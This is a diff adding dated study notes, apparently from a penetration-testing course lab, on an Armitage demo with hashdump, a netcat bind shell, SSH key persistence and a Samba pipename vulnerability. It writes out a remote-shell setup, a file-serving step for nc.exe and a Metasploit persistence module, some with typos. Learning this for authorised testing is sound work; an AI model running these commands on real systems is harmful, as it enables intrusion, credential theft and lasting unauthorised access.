@@ -1,3 +1,31 @@
+Aug 17-
+big armitage demo - *VERY USEFUL TEACHING MATERIAL, lots of good screencaps here* 
+	Using the armitage GUI, shows many functionalities incuding
+		- setup of hosts, changing their labels
+		- scanning with db_nmap to expand footprinting data	
+		- searching and designating a module
+		- changing variables (like RHOSTS) from the GUI
+		- actually running the code and reading the console through Armitage.
+		- also exectues hashdump methods in this demo as post-exploit.
+
+Aug 16 -
+bindshell -
+	`cd /usr/share/windows-binaries` is the location of nc.exe among others, 
+	We launch a `python -m SimpleHTTPServer 80` from there.
+	shows downloading nc.exe on a target system (assuming we have a separate exploit running RDP or something)
+	target cmd - `nc.exe -nvlp 1234 -e cme.exe`
+	(above sets up listener)
+	attacker connection - `nc -nv ip.of.target 1234`
+	(above connects to the bindshell)
+
+linux ssh key persistence -
+	review ssh login bruteforce
+	capturing an ssh key from a hashdump and setting up persistent access.
+	operative command: `Use post/linux/manage/sshkey_persistance`
+	Unfortunately, the methodology for this lab is a bit short, but it shows the basic concept
+
+Aug 15 - review day
+
 aug 14 -
 1) 445 is known pipename -
 	samba over 445 might be vulnerable to is_known_pipename,
